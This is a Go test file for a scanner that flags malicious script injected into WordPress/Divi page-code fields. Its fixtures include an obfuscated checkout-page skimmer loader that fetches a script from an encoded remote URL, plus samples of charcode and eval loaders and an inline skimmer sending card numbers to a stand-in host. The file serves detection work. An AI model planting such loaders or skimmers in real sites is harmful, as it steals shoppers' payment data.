package scan

import (
	"slices"
	"strings"
	"testing"
)

// skimmerLoader is the skimmer loader found in a client site's Divi body code in
// November 2026 (its URL is //defshld.com/js/core.js?v2.1).
const skimmerLoader = `<script>
o=["toLowerCase","wpadminbar","getElementById","cookie","test","cart_id","now","setItem","href","location","userAgent","getItem","body","querySelector","#Payment-frame","script","id","createElement","ix","src","Ly9kZWZzaGxkLmNvbS9qcy9jb3JlLmpzP3YyLjE","appendChild","getElementsByTagName", "DOMContentLoaded", "loading"];function _rd(){var n=document;_il=setInterval(function(){var e,t;function a(e){if(e)return e[o[0]]()}t=!1,(n[o[2]](o[1])||/admin|cart_id/[o[4]](a(n[o[3]])))&&localStorage[o[7]](o[5],Date[o[6]]()),/admin|cart_id/[o[4]](a(n[o[3]]))||!/checkout/[o[4]](a(n[o[9]][o[8]]))||/bot|google/[o[4]](a(navigator[o[10]]))||n[o[2]](o[1])||localStorage[o[11]](o[5])||!n[o[13]](o[12])||n[o[13]](o[14])||(t=!0),t&&(clearInterval(_il),e=o[15],(e=(t=n)[o[17]](e))[o[16]]=o[18],e[o[19]]=atob(o[20]),t[o[22]](o[12])[0][o[21]](e))},1e3)}o[24]==document.readyState?document.addEventListener(o[23],_rd):_rd();
</script>`

func TestPageCodePatterns(t *testing.T) {
	for _, c := range []struct {
		name, body string
		want       []string
	}{
		{"divi skimmer", "<script async src=\"https://www.googletagmanager.com/gtag/js?id=AW-1\"></script>" + strings.Repeat("\n", 50) + skimmerLoader, []string{"encoded-script-loader", "padded-script"}},
		{"charcode", `<script>var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,120,46,105,111);</script>`, []string{"charcode-script"}},
		{"eval", `<script>eval(function(p,a,c,k,e,d){return p}('x',1,1,'x'.split('|'),0,{}))</script>`, []string{"eval-code"}},
		{"document.write", `<script>document.write(unescape('%3Cscript%20src%3D%22//x.io/a.js%22%3E%3C/script%3E'))</script>`, []string{"encoded-write"}},
		{"inline skimmer", `<script>document.addEventListener('change',function(){var c=document.querySelector('[name=cardnumber]').value;navigator.sendBeacon('//x.io/c',c)})</script>`, []string{"card-exfiltration"}},

		// What sites put in these fields every day.
		{"gtm", `<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXX');</script>`, nil},
		{"meta pixel", `<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1');fbq('track', 'PageView');</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1&ev=PageView&noscript=1"/></noscript>`, nil},
		{"hotjar", `<script>(function(h,o,t,j,a,r){h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};h._hjSettings={hjid:1,hjsv:6};a=o.getElementsByTagName('head')[0];r=o.createElement('script');r.async=1;r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;a.appendChild(r);})(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');</script>`, nil},
		{"matomo", `<script>var _paq = window._paq = window._paq || [];_paq.push(['trackPageView']);(function() {var u="//stats.example.com/";_paq.push(['setTrackerUrl', u+'matomo.php']);var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);})();</script>`, nil},
		{"tripadvisor", `<div id="TA_selfserveprop834" class="TA_selfserveprop"></div><script src="https://www.jscache.com/wejs?wtype=selfserveprop&amp;uniq=834"></script>`, nil},
		{"cookiebot", `<script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="x" type="text/javascript" async></script>`, nil},
		{"card text", "<p>We accept Visa and Mastercard. The CVV is the three digits on the back of your card.</p>\n\n\n\n\n<script src=\"/badges.js\"></script>", nil},
	} {
		got, detail := matchPageCode([]byte(c.body))
		if !slices.Equal(got, c.want) {
			t.Errorf("%s: matched %q, want %q\n%s", c.name, got, c.want, detail)
		}
	}
}

func TestPageCodeEntries(t *testing.T) {
	out := "Deprecated: x\n{\"widget_text/4\":\"<p>hi</p>\",\"et_divi/divi_integration_body\":\"<script>eval(x)</script>\"}"
	entries, err := PageCodeEntries(out, 1001)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 2 || entries[0].Path != "db/et_divi/divi_integration_body" || entries[1].Path != "db/widget_text/4" {
		t.Fatalf("entries = %+v", entries)
	}
	if e := entries[0]; e.UID != 1001 || e.SHA256 == "" || e.Size != 24 || !slices.Equal(e.Content, []string{"eval-code"}) {
		t.Fatalf("entry = %+v", e)
	}
	if _, err := PageCodeEntries("Error: Error establishing a database connection", 1); err == nil {
		t.Fatal("no error for output without JSON")
	}
}
